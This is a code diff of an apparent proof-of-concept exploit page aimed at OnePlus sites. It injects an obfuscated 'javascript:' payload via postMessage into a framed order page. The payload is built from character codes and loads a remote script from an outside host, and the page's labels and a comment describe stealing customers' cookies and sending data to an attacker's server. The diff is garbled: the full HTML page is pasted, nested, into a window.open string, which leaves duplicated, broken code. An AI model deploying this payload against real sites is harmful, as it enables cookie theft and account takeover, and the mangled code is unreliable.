@@ -25,7 +25,113 @@ setTimeout(function(){
 	
 	//Other ways only pop the window for show cookies
 function openWin(){
-        h1Win = window.open("https://www.oneplus.com/cn",'_blank');
+        h1Win = window.open("<!DOCTYPE HTML>
+<html>
+<iframe src="https://my.oneplus.com/cn/order?from=head#" id="sendmessage"></iframe>
+<div>
+Steal user's cookies
+<textarea id="cookie" width=500px height=600px style="margin: 0px; height: 330px; width: 505px;"></textarea>
+</div>
+<button id="openH1">Other way-Click Here for start</button>
+<button id="stealaccount">Show customers's cookies with pop-windows</button>
+<script>
+var victim = document.getElementById('sendmessage').contentWindow;
+var h1Win;
+window.attackSuccess = false;
+window.addEventListener('message', function(e) {
+        console.log('Get data from oneplus ---> ' + e.data);
+	document.getElementById('cookie').innerHTML = e.data;
+    }, false);
+var payload = JSON.stringify({"type":"link_reload","url":"javasscjavascriptriptcript:document.write(String.fromCharCode(60,104,116,109,108,62,60,115,99,114,105,112,116,32,115,114,99,61,104,116,116,112,115,58,47,47,106,111,104,110,115,116,111,110,101,104,49,111,110,101,112,108,117,115,46,99,111,109,47,112,111,99,46,106,115,62,60,47,115,99,114,105,112,116,62,60,47,104,116,109,108,62))"});	
+	
+	
+setTimeout(function(){
+	victim.postMessage(payload,"*");
+}, 5000);
+
+	
+	//Other ways only pop the window for show cookies
+function openWin(){
+        h1Win = window.open("<!DOCTYPE HTML>
+<html>
+<iframe src="https://my.oneplus.com/cn/order?from=head#" id="sendmessage"></iframe>
+<div>
+Steal user's cookies
+<textarea id="cookie" width=500px height=600px style="margin: 0px; height: 330px; width: 505px;"></textarea>
+</div>
+<button id="openH1">Other way-Click Here for start</button>
+<button id="stealaccount">Show customers's cookies with pop-windows</button>
+<script>
+var victim = document.getElementById('sendmessage').contentWindow;
+var h1Win;
+window.attackSuccess = false;
+window.addEventListener('message', function(e) {
+        console.log('Get data from oneplus ---> ' + e.data);
+	document.getElementById('cookie').innerHTML = e.data;
+    }, false);
+var payload = JSON.stringify({"type":"link_reload","url":"javasscjavascriptriptcript:document.write(String.fromCharCode(60,104,116,109,108,62,60,115,99,114,105,112,116,32,115,114,99,61,104,116,116,112,115,58,47,47,106,111,104,110,115,116,111,110,101,104,49,111,110,101,112,108,117,115,46,99,111,109,47,112,111,99,46,106,115,62,60,47,115,99,114,105,112,116,62,60,47,104,116,109,108,62))"});	
+	
+	
+setTimeout(function(){
+	victim.postMessage(payload,"*");
+}, 5000);
+
+	
+	//Other ways only pop the window for show cookies
+function openWin(){
+        h1Win = window.open("https://open-api.tiktok.com/platform/oauth/connect?client_key=aw8cb3204x0a1g88&response_type=code&scope=user.info.basic%2Cvideo.list.no_watermark%2Cvideo.list.private_ads.no_watermark%2Cuser.account.configure%2Cvideo.list.manage%2Clive.list&version=1&lang=zh-Hant-TW&state=d39be4c7b0ccf91f926070f9db93daa47d92fbf0&redirect_uri=https%3A%2F%2Fads.tiktok.com%2Fi18n%2Flogin%2F%3F_extra%3DcGxhdGZvcm09dGlrdG9rJmxvZ2luX2FjdGlvbj1yZWRpcmVjdCZzaG93X2JpbmRfZXJyb3I9dHJ1ZSZzaG93X2xvZ291dD10cnVlJm9yaWdpbj1odHRwczovL2Fkcy50aWt0b2suY29tL2kxOG4vbG9naW4mdXNlcl9zZXR0aW5nX3N0YXR1cz10cnVlJnJlZGlyZWN0PWh0dHBzJTNBJTJGJTJGYWRzLnRpa3Rvay5jb20lMkZpMThuJTJGaG9tZSUyRiZmcm9tX3BhZ2U9bG9naW4.%26state%3Dd39be4c7b0ccf91f926070f9db93daa47d92fbf0&error_uri=https%3A%2F%2Fads.tiktok.com%2Fi18n%2Flogin%2F%3F_extra%3DcGxhdGZvcm09dGlrdG9rJmxvZ2luX2FjdGlvbj1yZWRpcmVjdCZzaG93X2JpbmRfZXJyb3I9dHJ1ZSZzaG93X2xvZ291dD10cnVlJm9yaWdpbj1odHRwczovL2Fkcy50aWt0b2suY29tL2kxOG4vbG9naW4mdXNlcl9zZXR0aW5nX3N0YXR1cz10cnVlJnJlZGlyZWN0PWh0dHBzJTNBJTJGJTJGYWRzLnRpa3Rvay5jb20lMkZpMThuJTJGaG9tZSUyRiZmcm9tX3BhZ2U9bG9naW4.%26state%3Dd39be4c7b0ccf91f926070f9db93daa47d92fbf0",'_blank');
+	let interval;
+        interval = setInterval(function(){
+            if (window.attackSuccess) {
+                clearInterval(interval)
+            } else {
+                var data = JSON.stringify({"type":"link_reload","url":"javasscjavascriptriptcript:String.fromCharCode(118,97,114,32,112,111,99,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,112,111,99,46,115,114,99,61,39,104,116,116,112,115,58,47,47,106,111,104,110,115,116,111,110,101,104,49,111,110,101,112,108,117,115,46,99,111,109,47,112,111,99,46,106,115,39,59,100,111,99,117,109,101,110,116,46,104,101,97,100,46,97,112,112,101,110,100,67,104,105,108,100,40,112,111,99,41,59))"});
+                h1Win.postMessage(data,"*");
+		window.attackSuccess = true;
+            }
+        }, 4000)
+    }
+
+function sendMessage(){
+	var data = JSON.stringify({"type":"link_reload","url":"javasscjavascriptriptcript:document.write(String.fromCharCode(60,104,116,109,108,62,60,115,99,114,105,112,116,32,115,114,99,61,104,116,116,112,115,58,47,47,106,111,104,110,115,116,111,110,101,104,49,111,110,101,112,108,117,115,46,99,111,109,47,112,111,99,46,106,115,62,60,47,115,99,114,105,112,116,62,60,47,104,116,109,108,62))"});
+	//you can change the url payload for send back some sensitive information to the attacker's server
+	h1Win.postMessage(data,"*");
+	}
+	
+ window.oneplus = function(cookie){
+        document.getElementById('cookie').innerHTML = cookie; 	
+    }
+	
+document.getElementById("openH1").addEventListener('click', openWin);
+document.getElementById("stealaccount").addEventListener('click', sendMessage);
+</script>
+</html>",'_blank');
+	let interval;
+        interval = setInterval(function(){
+            if (window.attackSuccess) {
+                clearInterval(interval)
+            } else {
+                var data = JSON.stringify({"type":"link_reload","url":"javasscjavascriptriptcript:String.fromCharCode(118,97,114,32,112,111,99,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,112,111,99,46,115,114,99,61,39,104,116,116,112,115,58,47,47,106,111,104,110,115,116,111,110,101,104,49,111,110,101,112,108,117,115,46,99,111,109,47,112,111,99,46,106,115,39,59,100,111,99,117,109,101,110,116,46,104,101,97,100,46,97,112,112,101,110,100,67,104,105,108,100,40,112,111,99,41,59))"});
+                h1Win.postMessage(data,"*");
+		window.attackSuccess = true;
+            }
+        }, 4000)
+    }
+
+function sendMessage(){
+	var data = JSON.stringify({"type":"link_reload","url":"javasscjavascriptriptcript:document.write(String.fromCharCode(60,104,116,109,108,62,60,115,99,114,105,112,116,32,115,114,99,61,104,116,116,112,115,58,47,47,106,111,104,110,115,116,111,110,101,104,49,111,110,101,112,108,117,115,46,99,111,109,47,112,111,99,46,106,115,62,60,47,115,99,114,105,112,116,62,60,47,104,116,109,108,62))"});
+	//you can change the url payload for send back some sensitive information to the attacker's server
+	h1Win.postMessage(data,"*");
+	}
+	
+ window.oneplus = function(cookie){
+        document.getElementById('cookie').innerHTML = cookie; 	
+    }
+	
+document.getElementById("openH1").addEventListener('click', openWin);
+document.getElementById("stealaccount").addEventListener('click', sendMessage);
+</script>
+</html>",'_blank');
 	let interval;
         interval = setInterval(function(){
             if (window.attackSuccess) {
